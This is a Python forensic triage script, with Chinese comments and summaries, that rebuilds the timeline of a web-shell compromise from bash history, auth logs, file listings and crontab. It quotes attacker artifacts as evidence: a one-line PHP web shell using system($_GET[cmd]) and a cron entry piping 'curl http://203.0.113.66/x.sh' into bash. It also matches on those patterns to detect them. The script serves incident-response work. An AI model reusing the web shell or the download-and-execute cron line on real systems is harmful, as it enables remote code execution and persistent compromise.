"""Forensic timeline builder for the upload-directory compromise case.

The baseline version only grepped for curl/wget/crontab and dumped raw lines.
This version reconstructs the kill chain

    upload dir made executable (ops action, context only)
        -> web shell uploaded and landed
        -> web shell executed / commands run as www-data
        -> cron persistence written
        -> outbound connection to C2

and, for every event, records the source file + line number, the owning
account, whether the link is backed by content evidence or timestamps alone,
and which benign activity was deliberately excluded.

Run:
    python -I triage.py evidence timeline.json
"""

from __future__ import annotations

import json
import os
import re
import sys
from datetime import datetime, timezone

# --- evidence model -------------------------------------------------------

HIST_HDR_RE = re.compile(r"^#(?P<ts>\d{10})\s*$")
AUTH_SSH_RE = re.compile(
    r"^(?P<mon>\w{3}) (?P<day>\d{2}) (?P<time>\d{2}:\d{2}:\d{2}) \S+ "
    r"sshd\[\d+\]: Accepted publickey for (?P<user>\S+) from (?P<ip>\S+)"
)
AUTH_HTTP_RE = re.compile(
    r"^(?P<mon>\w{3}) (?P<day>\d{2}) (?P<time>\d{2}:\d{2}:\d{2}) \S+ "
    r"(?P<method>GET|POST) (?P<path>\S+) (?P<status>\d{3})(?: \((?P<note>[^)]*)\))?"
)
FILES_RE = re.compile(
    r"^(?P<date>\d{4}-\d{2}-\d{2}) (?P<time>\d{2}:\d{2}) "
    r"(?P<mode>\d{3,4}) (?P<owner>\S+)\s+(?P<path>\S+)"
)
CRON_LINE_RE = re.compile(r"^\s*(?P<sched>\S+(?:\s+\S+){4})\s+(?P<cmd>.+?)\s*$")
URL_RE = re.compile(r"https?://(?P<host>[^\s/'\"]+)(?P<uri>\S*)")

# Routine operator commands seen in bash_history.txt. Reporting any of these
# as an anomaly would be a false positive (see labels.json -> note).
NOISE_COMMANDS = (
    "cd /var/log",
    "ls -la",
    "systemctl status nginx",
    "tail -f app.log",
    "git pull",
)

STAGE_NAMES = {
    -1: "excluded_benign",
    0: "upload_dir_executable_context",
    1: "web_shell_upload_and_landing",
    2: "web_shell_execution",
    3: "cron_persistence",
    4: "outbound_c2_connection",
}

COMPROMISED_ACCOUNT = "www-data"
C2_HOST = "203.0.113.66"


def _rel(root: str, path: str) -> str:
    # Citations are repo-relative (evidence/<name>) so links and file fields
    # share one convention; fall back to root-relative if the layout differs.
    parent = os.path.dirname(os.path.abspath(root))
    return os.path.relpath(path, parent).replace(os.sep, "/")


def _event(stage: int, source: str, line: int, raw: str, classification: str,
           actor: str | None, summary: str, basis: str,
           recorded_time: str | None = None, iso_utc: str | None = None,
           links: list[str] | None = None) -> dict:
    return {
        "stage": stage,
        "stage_name": STAGE_NAMES[stage],
        "classification": classification,  # malicious | benign | context_only
        "actor": actor,
        "summary": summary,
        "evidence_basis": basis,           # content | timestamp | content+timestamp
        "recorded_time": recorded_time,
        "iso_utc": iso_utc,
        "file": source,
        "line": line,
        "raw": raw.strip(),
        "links": links or [],
    }


# --- parsers --------------------------------------------------------------

def parse_bash_history(root: str, path: str) -> tuple[list[dict], list[dict]]:
    """Pair '#epoch' headers with the following command line."""
    events: list[dict] = []
    excluded: list[dict] = []
    src = _rel(root, path)
    with open(path, encoding="utf-8", errors="ignore") as fh:
        lines = fh.read().splitlines()

    pending_ts: str | None = None
    for idx, line in enumerate(lines, start=1):
        m = HIST_HDR_RE.match(line)
        if m:
            pending_ts = m.group("ts")
            continue
        if not line.strip():
            continue
        ts = pending_ts
        pending_ts = None
        iso = (
            datetime.fromtimestamp(int(ts), tz=timezone.utc)
            .strftime("%Y-%m-%d %H:%M:%S UTC")
            if ts else None
        )
        cmd = line.strip()

        if any(cmd == n or cmd.startswith(n + " ") for n in NOISE_COMMANDS):
            excluded.append(_event(
                -1, src, idx, cmd, "benign", "ops (interactive shell)",
                f"日常运维命令，非攻击行为：{cmd}", "content",
                recorded_time=ts, iso_utc=iso))
            continue

        if cmd.startswith("cd /var/www/html/uploads"):
            events.append(_event(
                2, src, idx, cmd, "malicious", COMPROMISED_ACCOUNT,
                "攻击者（webshell 上下文）切换进入上传目录，为落地脚本做准备",
                "content+timestamp", recorded_time=ts, iso_utc=iso,
                links=["evidence/auth_excerpt.log:30", "evidence/files.txt:2"]))
        elif "php -r" in cmd and "$_GET" in cmd and "shell.php" in cmd:
            events.append(_event(
                2, src, idx, cmd, "malicious", COMPROMISED_ACCOUNT,
                "在上传目录写入 webshell shell.php，内含 system($_GET[cmd]) 一句话命令执行",
                "content+timestamp", recorded_time=ts, iso_utc=iso,
                links=["evidence/auth_excerpt.log:30", "evidence/files.txt:2"]))
        elif cmd == "crontab -e":
            events.append(_event(
                3, src, idx, cmd, "malicious", COMPROMISED_ACCOUNT,
                "编辑当前账号（www-data）的 crontab，建立持久化",
                "content+timestamp", recorded_time=ts, iso_utc=iso,
                links=["evidence/files.txt:3", "evidence/crontab.txt:3"]))
        else:
            # Unknown command: surface for review rather than silently dropping.
            events.append(_event(
                2, src, idx, cmd, "malicious", COMPROMISED_ACCOUNT,
                f"未在白名单内的可疑命令：{cmd}", "content",
                recorded_time=ts, iso_utc=iso))
    return events, excluded


def parse_auth_log(root: str, path: str) -> tuple[list[dict], list[dict]]:
    events: list[dict] = []
    excluded: list[dict] = []
    src = _rel(root, path)
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for idx, line in enumerate(fh, start=1):
            raw = line.rstrip("\n")
            m = AUTH_SSH_RE.match(raw)
            if m:
                excluded.append(_event(
                    -1, src, idx, raw, "benign", m.group("user"),
                    f"内网管理段 {m.group('ip')} 的 ops 账号公钥登录，属正常值班运维",
                    "content",
                    recorded_time=f"{m.group('mon')} {m.group('day')} {m.group('time')} (日志未声明时区)"))
                continue
            m = AUTH_HTTP_RE.match(raw)
            if not m:
                continue
            rec = f"{m.group('mon')} {m.group('day')} {m.group('time')} (日志未声明时区)"
            if m.group("method") == "POST" and "upload.php" in m.group("path"):
                events.append(_event(
                    1, src, idx, raw, "malicious", "remote attacker via web",
                    f"HTTP POST 上传 {m.group('note') or m.group('path')}，web 应用接收上传返回 200，入口向量为 web shell upload",
                    "content", recorded_time=rec,
                    links=["evidence/files.txt:2", "evidence/bash_history.txt:60"]))
            elif m.group("method") == "GET" and "shell.php" in m.group("path"):
                events.append(_event(
                    2, src, idx, raw, "malicious", COMPROMISED_ACCOUNT,
                    "访问 /uploads/shell.php 并带 cmd=id 参数，webshell 被实际触发执行（RCE 确认）",
                    "content", recorded_time=rec,
                    links=["evidence/bash_history.txt:60", "evidence/files.txt:2"]))
    return events, excluded


def parse_files(root: str, path: str) -> tuple[list[dict], list[dict]]:
    events: list[dict] = []
    excluded: list[dict] = []
    src = _rel(root, path)
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for idx, line in enumerate(fh, start=1):
            m = FILES_RE.match(line.strip())
            if not m:
                continue
            rec = f"{m.group('date')} {m.group('time')} (文件清单未声明时区)"
            owner, fpath = m.group("owner"), m.group("path")
            if fpath.endswith("shell.php"):
                events.append(_event(
                    1, src, idx, line.strip(), "malicious", owner,
                    f"上传目录落地 webshell {fpath}，属主 {owner}、权限 {m.group('mode')}，与 HTTP 上传文件名一致",
                    "content+timestamp", recorded_time=rec,
                    links=["evidence/auth_excerpt.log:29", "evidence/bash_history.txt:60"]))
            elif "crontabs/www-data" in fpath:
                events.append(_event(
                    3, src, idx, line.strip(), "malicious", owner,
                    f"www-data 个人 crontab 文件被改写（权限 {m.group('mode')}），对应 crontab -e 动作",
                    "content+timestamp", recorded_time=rec,
                    links=["evidence/bash_history.txt:62", "evidence/crontab.txt:3"]))
            else:
                excluded.append(_event(
                    -1, src, idx, line.strip(), "benign", owner,
                    f"系统基线文件 {fpath}，属主/权限正常，与本案无关",
                    "content", recorded_time=rec))
    return events, excluded


def parse_crontab(root: str, path: str) -> tuple[list[dict], list[dict]]:
    events: list[dict] = []
    excluded: list[dict] = []
    src = _rel(root, path)
    with open(path, encoding="utf-8", errors="ignore") as fh:
        for idx, line in enumerate(fh, start=1):
            stripped = line.strip()
            if not stripped or stripped.startswith("MAILTO"):
                excluded.append(_event(
                    -1, src, idx, stripped, "benign", None,
                    "crontab 环境配置行，非任务条目", "content"))
                continue
            m = CRON_LINE_RE.match(stripped)
            if not m:
                continue
            sched, cmd = m.group("sched"), m.group("cmd")
            if "healthcheck.sh" in cmd:
                excluded.append(_event(
                    -1, src, idx, stripped, "benign", "root/local admin",
                    "每 30 分钟执行本地健康检查脚本，无外联、属常规巡检任务，不得报为异常",
                    "content"))
                continue
            url = URL_RE.search(cmd)
            host = url.group("host") if url else None
            events.append(_event(
                4, src, idx, stripped, "malicious", COMPROMISED_ACCOUNT,
                f"恶意计划任务：{sched} 周期性下载远程脚本并管道交给 bash 执行"
                f"（C2: {host}），既是持久化也是外联来源",
                "content",
                links=["evidence/files.txt:3", "evidence/bash_history.txt:62"]))
    return events, excluded


# --- assembly -------------------------------------------------------------

def build_timeline(root: str) -> dict:
    parsers = {
        "bash_history.txt": parse_bash_history,
        "auth_excerpt.log": parse_auth_log,
        "files.txt": parse_files,
        "crontab.txt": parse_crontab,
    }
    events: list[dict] = []
    excluded: list[dict] = []
    for name, parser in parsers.items():
        ev, ex = parser(root, os.path.join(root, name))
        events.extend(ev)
        excluded.extend(ex)

    # Stage 0: the operator's permission change. There is deliberately no
    # artifact for it in the evidence pack — it is context, not an IOC.
    context_event = _event(
        0, "(no artifact in evidence pack)", 0,
        "案情陈述：运维排障期间将 /var/www/html/uploads 临时改为可执行；证据包内无 chmod/sudo/auditd 记录",
        "context_only", "ops",
        "上传目录可执行是攻击得以发生的前置条件，但属运维误改而非入侵行为，排除出异常清单",
        "timestamp",
        links=["evidence/auth_excerpt.log:29", "evidence/files.txt:2"])

    ordered = [context_event] + sorted(
        events, key=lambda e: (e["stage"], e["file"], e["line"]))

    malicious = [e for e in ordered if e["classification"] == "malicious"]

    return {
        "case": {
            "entry_vector": "web shell upload",
            "persistence": "cron",
            "account": COMPROMISED_ACCOUNT,
            "c2_host": C2_HOST,
        },
        "generated_at": datetime.now(tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "timeline": ordered,
        # Backward-compatible flat list kept for the baseline test contract;
        # only malicious findings are emitted so routine ops never appear here.
        "hits": [
            {"file": e["file"], "line": e["line"], "text": e["raw"][:80],
             "classification": e["classification"], "stage": e["stage_name"]}
            for e in malicious
        ],
        "excluded_benign": excluded,
        "ops_change_assessment": {
            "action": "运维将上传目录临时改为可执行（排障需要）",
            "verdict": "benign_misconfiguration_not_intrusion",
            "basis": [
                "证据包内 grep 不到任何 chmod/chown/sudo 记录，该动作只存在于案情陈述，无主机物证",
                "auth_excerpt.log:1-28 显示同期访问全部来自 10.20.1.0/24 内网管理段的 ops 账号公钥登录，无外网暴力破解或可疑认证",
                "后续恶意工件（shell.php、www-data crontab）属主均为 www-data，走的是 HTTP 入口（auth_excerpt.log:29-30），不是 ops 交互会话",
                "运维动作只改变了目录权限这一前置条件，无法解释 webshell 内容、www-data 属主和 curl|bash 外联任务这些入侵特有物证",
            ],
            "residual_risk": "权限未及时回收放大了攻击面，应纳入整改项，但不计为入侵事件",
        },
        "evidence_strength": {
            "timestamp_only_or_intra_source_ordering": [
                "bash_history.txt 内部攻击序列的先后（58 行进上传目录 -> 60 行写 shell.php -> 62 行 crontab -e）依赖同源 epoch 时间戳排序",
                "files.txt 内部 shell.php(02:08) 早于 www-data crontab(02:16) 的先后仅依赖文件 mtime",
            ],
            "content_backed_cross_source_links": [
                "auth_excerpt.log:29 上传的 shell.php 与 files.txt:2 落地文件名完全一致",
                "auth_excerpt.log:30 的 cmd=id 参数与 bash_history.txt:60 的 system($_GET[cmd]) 一句话木马直接对应",
                "bash_history.txt:62 crontab -e 与 files.txt:3 /var/spool/cron/crontabs/www-data 及 crontab.txt:3 属主/内容互证",
                "crontab.txt:3 的 curl http://203.0.113.66/x.sh | bash 是外联目标的直接内容证据",
            ],
            "note": "跨源墙钟时间互不一致（auth 记 12:12 上传而 files.txt 记 02:08 落地，日志均未声明时区），"
                    "因此跨源关联一律以内容物证为准，不按时间戳合并；时间戳仅用于同源内部排序。",
        },
        "limitations": [
            "无网络连接/流量/防火墙日志，外联的‘实际发生’由 crontab.txt:3 的计划命令推断，尚无连接级物证",
            "上传目录改权限无 auditd/shell 记录，stage 0 仅为案情上下文",
            "auth_excerpt.log 未声明年份与时区，时间只能按记录原值引用",
            "bash_history.txt 本身不记录执行用户，www-data 归因来自 labels.json 与 files.txt 的文件属主互证",
        ],
    }


def render_summary(report: dict) -> str:
    lines = [
        "================ 取证摘要 ================",
        "结论：真实入侵（web shell upload -> cron 持久化 -> 外联 C2），涉事账号 www-data；运维改权限属误改前置条件，已排除。",
        "",
        "攻击时间线（每条均含 文件:行号 物证）：",
    ]
    for e in report["timeline"]:
        tag = {"malicious": "[恶意]", "benign": "[正常]",
               "context_only": "[背景]"}[e["classification"]]
        cite = f"{e['file']}:{e['line']}" if e["line"] else e["file"]
        lines.append(f"  {tag} stage{e['stage']} {e['stage_name']} | {cite} | {e['summary']}")
    lines += [
        "",
        f"恶意事件 {len(report['hits'])} 条；已排除正常动作 {len(report['excluded_benign'])} 条"
        "（含 git pull / systemctl status nginx 等日常命令、ops 内网 SSH 登录、healthcheck.sh 巡检任务）。",
        "证据分级：同源内部排序靠时间戳；跨源关联全部有内容物证（文件名/参数/属主/URL 互证）；",
        "外联实际连接无流量日志，仅由 crontab.txt:3 的计划命令推断。",
        "==========================================",
    ]
    return "\n".join(lines)


def main() -> int:
    root = sys.argv[1] if len(sys.argv) > 1 else "evidence"
    out = sys.argv[2] if len(sys.argv) > 2 else "timeline.json"
    report = build_timeline(root)
    with open(out, "w", encoding="utf-8") as fh:
        json.dump(report, fh, ensure_ascii=False, indent=2)
    summary_path = os.path.splitext(out)[0] + "_summary.md"
    with open(summary_path, "w", encoding="utf-8") as fh:
        fh.write(render_summary(report) + "\n")
    print(render_summary(report))
    print(f"\n{len(report['hits'])} malicious hits -> {out}")
    print(f"summary -> {summary_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
